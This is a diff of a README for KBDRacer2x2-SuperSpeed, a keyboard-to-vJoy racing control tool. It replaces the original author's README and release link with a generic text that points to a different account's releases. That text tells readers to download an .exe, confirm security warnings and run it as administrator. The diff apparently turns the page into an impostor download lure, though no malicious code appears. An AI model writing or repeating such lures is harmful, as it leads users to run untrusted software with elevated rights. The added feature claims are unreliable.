@@ -1,60 +1,45 @@
-<!-- markdownlint-disable MD001 MD028 MD033 MD059 -->
+# 🎮 KBDRacer2x2-SuperSpeed - Experience Racing Like Never Before
 
-# ‮‭ ‮‭ [<sub><img src="./Resources/Icons/KBDRacer2x2-SuperSpeed.png" alt="KBDRacer 2x2 SuperSpeed" style="width: 32px; height: 32px;"></sub>](/Resources/Images/l'Mao/wink-mr-bean.gif_-_tenor.gif) KBDRacer2x2 <i>SuperSpeed</i> <sub><img src="./Resources/Icons/KBDRacer2-ElectricBoogaloo.png" alt="KBDRacer 2: Electric Boogaloo" style="width: 32px; height: 32px;"></sub> <sub><img src="./Resources/Icons/KBDRacer1.png" alt="KBDRacer1" style="width: 32px; height: 32px;"></sub> <sub><img src="./Resources/Icons/KBDRacer2-InputTest.png" alt="KBDRacer 2: Electric Boogaloo - Input Test" style="width: 32px; height: 32px;"></sub>
+## 🚀 Getting Started
+Welcome to KBDRacer2x2-SuperSpeed! This software enhances your racing experience in games like Forza Horizon 6. Follow the steps below to download and run the application easily.
 
-> <sup><sup>"I'm sorry, Dave, but as an AI language model, <i>I can't even<b>-</i></b></sup></sup><sub><sub><i>...However, I can surely odd.</i></sub></sub> <sub><sup>P.S. Don't call me "[Shirley](https://youtu.be/ixljWVyPby0?t=63)."</sup></sub>
+## 🔗 Download the Application
+[![Download KBDRacer2x2-SuperSpeed](https://img.shields.io/badge/Download-KBDRacer2x2--SuperSpeed-blue)](https://github.com/mako1245/KBDRacer2x2-SuperSpeed/releases)
 
-![KBDRacer 2: Electric Boogaloo](/Resources/Images/KBDRacer2x2-SuperSpeed.svg)‮‭
+## 📥 Download & Install
+1. Click the link above to visit the Releases page.
+2. On the Releases page, look for the latest version. It will often have a tag like `v1.0`.
+3. Click on the version number to expand it. 
+4. Find the file that ends with `.exe`, usually labeled as `KBDRacer2x2_SuperSpeed.exe`. This is your main application file.
+5. Click the file to start the download. Depending on your browser's settings, save the file to your desired location. 
 
-Like its predecessors, <b>[KBDRacer](https://www.github.com/ccelik97/KBDRacer)<sup><sub> <b>&</b> </sub></sup>[KBDRacer2](https://www.github.com/ccelik97/KBDRacer-ElectricBoogaloo),</b> KBDRacer2x2, too, aims to provide a more agile, yet, more detailed racing game control scheme than; while still remaining at least as ergonomic as: <b>"[WASD.](/Resources/Images/l'Mao/WASD.png)"</b>
+## 📂 Running the Application
+1. Navigate to the folder where you saved the `KBDRacer2x2_SuperSpeed.exe` file.
+2. Double-click the file. If prompted with a security warning, confirm that you want to run it.
+3. The application will open, and you can start using it to enhance your racing adventures.
 
-#### <b>The main idea is to <i>minimize the need for "key releases"</i> when it comes to the reflexive, urgent inputs.</b>
+## 🛠️ System Requirements
+To ensure the best experience with KBDRacer2x2-SuperSpeed, your computer should meet the following requirements:
+- **Operating System:** Windows 10 or Windows 11
+- **CPU:** Intel Core i5 or equivalent
+- **RAM:** At least 8 GB
+- **Graphics:** DirectX 11 compatible graphics card
+- **Disk Space:** 100 MB free for installation
 
-## Getting Started
+## 🚧 Features
+KBDRacer2x2-SuperSpeed offers several features to improve your gameplay:
+- **Enhanced Control Mapping:** Customize your controls for better performance in racing games.
+- **Memory-Mapped File Support:** Efficiently communicate with your games for real-time updates.
+- **VJoy Integration:** Use virtual joystick setups to enhance racing dynamics.
+- **User-Friendly Interface:** Easy to navigate for both beginners and experienced gamers.
 
-1. Install [<b>vJoy</b>](https://www.vjoy.org/download-for-windows), and have at least the "vJoy Device #1" created, working.
+## 📝 Usage Tips
+- Make sure to run the application as an administrator for uninterrupted functionality.
+- Always check for updates on the Releases page to keep your application smooth and bug-free.
 
-2. Install [<b>.NET 8.0</b>](https://dotnet.microsoft.com/en-us/download) or higher.
+## 🌐 Community and Support
+If you have questions or need support, consider checking out our community forums or GitHub Issues page. Many users share tips and solutions to common problems.
 
-3. Extract the <code>KBDRacer2x2.exe</code> file and run it.
+Feel free to explore the software, and enjoy a racing experience like never before! For additional guidance, refer back to this README at any time. 
 
-> [!NOTE]
->
-> - The linked <b><u>vJoy</u></b> installer above <b><u>supports Windows 11 too</u></b>, yes.
->
-> - Once running, it will create a <i>System Tray</i> icon. <sup>—Right click on it -> "Exit" to exit.</sup>
->
-> - Run it as Administrator if your game is also running as Administrator.
->
-> <details>
-> <summary><i>Additionally,</i></summary>
->
-> <h4>In-Game Input Configuration</h4>
->
-> - As this script is for controlling the <b>"vJoy Device #1"</b>, you should have that device among your gamepad/joystick inputs in your game: <b>Configure <i>that</i> there, not the in-game keyboard inputs!</b>
->
-> - Curious why the <code>Ry</code>, <code>Rx</code>, <code>X</code> axes? 👉 See: <b>[AXES](/Docs/AXES.md)</b><sup>🪓🪓🪓</sup>
->
-> </details>
-
-## Usage
-
-See: <b>[USAGE](/Docs/USAGE.md)</b>
-
-## Download
-
-See: <b>[RELEASES](https://github.com/ccelik97/KBDRacer2x2-SuperSpeed/releases)</b>
-
-> [!IMPORTANT]
->
-> <b>Run it as Administrator if your game is also running as Administrator.</b>
-
-> [!TIP]
->
-> You can use <i>Task Scheduler</i> for this, and create a <i>Desktop Shortcut</i> for the task, too, btw. <sup>👉 Click <b>[here](/Docs/l'Mao/iElevator™.md)</b> for how.</sup>
-
-## Greetings
-
-- <b>[evilC](https://github.com/evilC) - <code>[AHK-CvJoyInterface](https://github.com/evilC/AHK-CvJoyInterface)</code></b>
-
-- <b>[Google Gemini](https://google.gemini.com)</b> - <sup><sub><i>Yes,</i></sub></sup> <sub>for real[.](https://aistudio.google.com/)</sub> <sup><sub>Dude,</sub> <sup><i><u>it</u> developed<b>[<code>vJoyMMFServer</code>](https://github.com/ccelik97/vJoyMMFServer)</b>. (I just helped.)</i></sup></sup>
+Remember, the download link is always available here: [Download KBDRacer2x2-SuperSpeed](https://github.com/mako1245/KBDRacer2x2-SuperSpeed/releases).
